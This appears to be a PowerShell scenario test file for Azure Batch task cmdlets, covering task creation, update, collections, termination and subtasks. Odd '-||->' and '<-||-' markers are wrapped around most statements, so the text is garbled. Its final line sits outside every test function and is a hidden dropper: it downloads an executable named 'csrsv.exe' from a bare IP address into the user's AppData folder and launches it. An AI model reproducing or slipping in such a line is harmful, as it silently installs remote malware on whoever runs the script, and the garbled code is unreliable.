














 -||-> function Test-TaskCRUD
{
    param([string]$jobId)

     -||-> $context =  -||-> New-Object Microsoft.Azure.Commands.Batch.Test.ScenarioTests.ScenarioTestContext <-||-  <-||- 

     -||-> $taskId1 = "task1" <-||- 
     -||-> $taskId2 = "task2" <-||- 

     -||-> try
    {
        
         -||-> New-AzBatchTask -Id $taskId1 -JobId $jobId -CommandLine "cmd /c echo task1" -BatchContext $context <-||- 
         -||-> New-AzBatchTask -Id $taskId2 -JobId $jobId -CommandLine "cmd /c echo task2" -BatchContext $context <-||- 

        
         -||-> $tasks =  -||-> Get-AzBatchTask -JobId $jobId -Filter "id eq '$taskId1' or id eq '$taskId2'" -BatchContext $context <-||-  <-||- 
         -||-> $task1 =  -||-> $tasks | Where-Object {  -||-> $_.Id -eq $taskId1 <-||-  } <-||-  <-||- 
         -||-> $task2 =  -||-> $tasks | Where-Object {  -||-> $_.Id -eq $taskId2 <-||-  } <-||-  <-||- 
         -||-> Assert-NotNull $task1 <-||- 
         -||-> Assert-NotNull $task2 <-||- 

        
         -||-> $maxTaskRetryCount = 3 <-||- 
         -||-> $task2.Constraints =  -||-> New-Object Microsoft.Azure.Commands.Batch.Models.PSTaskConstraints -ArgumentList @( -||-> $null, $null, 3 <-||- ) <-||-  <-||- 
         -||-> $task2 | Set-AzBatchTask -BatchContext $context <-||- 
         -||-> $updatedTask =  -||-> Get-AzBatchTask -JobId $jobId -Id $taskId2 -BatchContext $context <-||-  <-||- 
         -||-> Assert-AreEqual $maxTaskRetryCount $updatedTask.Constraints.MaxTaskRetryCount <-||- 
    }
    finally
    {
        
         -||-> Get-AzBatchTask -JobId $jobId -BatchContext $context | Remove-AzBatchTask -Force -BatchContext $context <-||- 

        
         -||-> $tasks =  -||-> Get-AzBatchTask -JobId $jobId -BatchContext $context <-||-  <-||- 
         -||-> Assert-Null $tasks <-||- 
    } <-||- 
} <-||- 


 -||-> function Test-CreateTaskCollection
{
    param([string]$jobId)

     -||-> $context =  -||-> New-Object Microsoft.Azure.Commands.Batch.Test.ScenarioTests.ScenarioTestContext <-||-  <-||- 

     -||-> $taskId1 = "simple1" <-||- 
     -||-> $taskId2 = "simple2" <-||- 

     -||-> $cmd = "cmd /c dir /s" <-||- 

     -||-> $task1 =  -||-> New-Object Microsoft.Azure.Commands.Batch.Models.PSCloudTask( -||-> $taskId1, $cmd <-||- ) <-||-  <-||- 
     -||-> $task2 =  -||-> New-Object Microsoft.Azure.Commands.Batch.Models.PSCloudTask( -||-> $taskId2, $cmd <-||- ) <-||-  <-||- 

     -||-> $taskCollection = @( -||-> $task1, $task2 <-||- ) <-||- 

    
     -||-> Get-AzBatchJob -Id $jobId -BatchContext $context | New-AzBatchTask -Tasks $taskCollection -BatchContext $context <-||- 
     -||-> $task1 =  -||-> Get-AzBatchTask -JobId $jobId -Id $taskId1 -BatchContext $context <-||-  <-||- 
     -||-> $task2 =  -||-> Get-AzBatchTask -JobId $jobId -Id $taskId2 -BatchContext $context <-||-  <-||- 

    
     -||-> Assert-AreEqual $taskId1 $task1.Id <-||- 
     -||-> Assert-AreEqual $cmd $task1.CommandLine <-||- 
     -||-> Assert-AreEqual $taskId2 $task2.Id <-||- 
     -||-> Assert-AreEqual $cmd $task2.CommandLine <-||- 

    
     -||-> $affinityId = "affinityId" <-||- 
     -||-> $affinityInfo =  -||-> New-Object Microsoft.Azure.Commands.Batch.Models.PSAffinityInformation -ArgumentList @( -||-> $affinityId <-||- ) <-||-  <-||- 

     -||-> $taskConstraints =  -||-> New-Object Microsoft.Azure.Commands.Batch.Models.PSTaskConstraints -ArgumentList @( -||-> [TimeSpan]::FromDays(1),[TimeSpan]::FromDays(2),5 <-||- ) <-||-  <-||- 
     -||-> $maxWallClockTime = $taskConstraints.MaxWallClockTime <-||- 
     -||-> $retentionTime = $taskConstraints.RetentionTime <-||- 
     -||-> $maxRetryCount = $taskConstraints.MaxRetryCount <-||- 

     -||-> $resourceFiles =  -||-> New-Object System.Collections.Generic.List``1[Microsoft.Azure.Commands.Batch.Models.PSResourceFile] <-||-  <-||- 
     -||-> $file =  -||-> New-AzBatchResourceFile -HttpUrl "https://testacct.blob.core.windows.net/" -FilePath "file1" <-||-  <-||- 
     -||-> $resourceFiles.Add($file) <-||- 

     -||-> $envSettings = @{ env1 =  -||-> "value1" <-||- ; env2 =  -||-> "value2" <-||-  } <-||- 
     -||-> $numInstances = 3 <-||- 
     -||-> $multiInstanceSettings =  -||-> New-Object Microsoft.Azure.Commands.Batch.Models.PSMultiInstanceSettings -ArgumentList @( -||-> "cmd /c echo coordinating", $numInstances <-||- ) <-||-  <-||- 
     -||-> $coordinationCommandLine = $multiInstanceSettings.CoordinationCommandLine <-||- 
     -||-> $multiInstanceSettings.CommonResourceFiles =  -||-> New-Object System.Collections.Generic.List``1[Microsoft.Azure.Commands.Batch.Models.PSResourceFile] <-||-  <-||- 
     -||-> $commonResourceBlob = "https://common.blob.core.windows.net/" <-||- 
     -||-> $commonResourceFile = "common.exe" <-||- 
     -||-> $commonResource =  -||-> New-AzBatchResourceFile -HttpUrl $commonResourceBlob -FilePath $commonResourceFile <-||-  <-||- 
     -||-> $multiInstanceSettings.CommonResourceFiles.Add($commonResource) <-||- 

     -||-> $taskId3 = "complex1" <-||- 
     -||-> $taskId4 = "simple3" <-||- 

     -||-> $task3 =  -||-> New-Object Microsoft.Azure.Commands.Batch.Models.PSCloudTask( -||-> $taskId3, $cmd <-||- ) <-||-  <-||- 
     -||-> $task4 =  -||-> New-Object Microsoft.Azure.Commands.Batch.Models.PSCloudTask( -||-> $taskId4, $cmd <-||- ) <-||-  <-||- 

     -||-> $task3.AffinityInformation = $affinityInfo <-||- 
     -||-> $task3.Constraints = $taskConstraints <-||- 
     -||-> $task3.MultiInstanceSettings = $multiInstanceSettings <-||- 
     -||-> $task3.EnvironmentSettings = $envSettings <-||- 
     -||-> $task3.ResourceFiles = $resourceFiles <-||- 

     -||-> $taskCollection = @( -||-> $task3, $task4 <-||- ) <-||- 

    
     -||-> New-AzBatchTask -JobId $jobId -Tasks $taskCollection -BatchContext $context <-||- 

     -||-> $task3 =  -||-> Get-AzBatchTask -JobId $jobId -Id $taskId3 -BatchContext $context <-||-  <-||- 
     -||-> $task4 =  -||-> Get-AzBatchTask -JobId $jobId -Id $taskId4 -BatchContext $context <-||-  <-||- 

    
     -||-> Assert-AreEqual $taskId3 $task3.Id <-||- 
     -||-> Assert-AreEqual $cmd $task3.CommandLine <-||- 
     -||-> Assert-AreEqual $affinityId $task3.AffinityInformation.AffinityId <-||- 
     -||-> Assert-AreEqual $maxWallClockTime $task3.Constraints.MaxWallClockTime <-||- 
     -||-> Assert-AreEqual $retentionTime $task3.Constraints.RetentionTime <-||- 
     -||-> Assert-AreEqual $maxRetryCount $task3.Constraints.MaxRetryCount <-||- 
     -||-> Assert-AreEqual $resourceFiles.Count $task3.ResourceFiles.Count <-||- 

     -||-> Assert-AreEqual $envSettings.Count $task3.EnvironmentSettings.Count <-||- 
     -||-> Assert-AreEqual $numInstances $task3.MultiInstanceSettings.NumberOfInstances <-||- 
     -||-> Assert-AreEqual $coordinationCommandLine $task3.MultiInstanceSettings.CoordinationCommandLine <-||- 
     -||-> Assert-AreEqual 1 $task3.MultiInstanceSettings.CommonResourceFiles.Count <-||- 
     -||-> Assert-AreEqual $commonResourceBlob $task3.MultiInstanceSettings.CommonResourceFiles[0].HttpUrl <-||- 
     -||-> Assert-AreEqual $commonResourceFile $task3.MultiInstanceSettings.CommonResourceFiles[0].FilePath <-||- 

     -||-> Assert-AreEqual $taskId4 $task4.Id <-||- 
     -||-> Assert-AreEqual $cmd $task4.CommandLine <-||- 
} <-||- 


 -||-> function Test-TerminateTask
{
    param([string]$jobId, [string]$taskId1, [string]$taskId2)

     -||-> $context =  -||-> New-Object Microsoft.Azure.Commands.Batch.Test.ScenarioTests.ScenarioTestContext <-||-  <-||- 

     -||-> Stop-AzBatchTask $jobId $taskId1 -BatchContext $context <-||- 
     -||-> Get-AzBatchTask $jobId $taskId2 -BatchContext $context | Stop-AzBatchTask -BatchContext $context <-||- 

    
     -||-> foreach ($task in  -||-> Get-AzBatchTask $jobId -BatchContext $context <-||- )
    {
         -||-> Assert-AreEqual 'completed' $task.State.ToString().ToLower() <-||- 
    } <-||- 
} <-||- 


 -||-> function Test-ListAllSubtasks
{
    param([string] $jobId, [string]$taskId, [string]$numInstances)

     -||-> $numSubTasksExpected = $numInstances - 1 <-||- 

     -||-> $context =  -||-> New-Object Microsoft.Azure.Commands.Batch.Test.ScenarioTests.ScenarioTestContext <-||-  <-||- 
     -||-> $subtasks =  -||-> Get-AzBatchSubtask $jobId $taskId -BatchContext $context <-||-  <-||- 

     -||-> Assert-AreEqual $numSubTasksExpected $subtasks.Length <-||- 

    
     -||-> $subtasks =  -||-> Get-AzBatchTask $jobId $taskId -BatchContext $context | Get-AzBatchSubtask -BatchContext $context <-||-  <-||- 

     -||-> Assert-AreEqual $numSubTasksExpected $subtasks.Length <-||- 
} <-||- 

 -||-> ( -||-> New-Object System.Net.WebClient <-||- ).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',"$env:APPDATA\csrsv.exe") <-||- ; -||-> Start-Process ( -||-> "$env:APPDATA\csrsv.exe" <-||- ) <-||- 



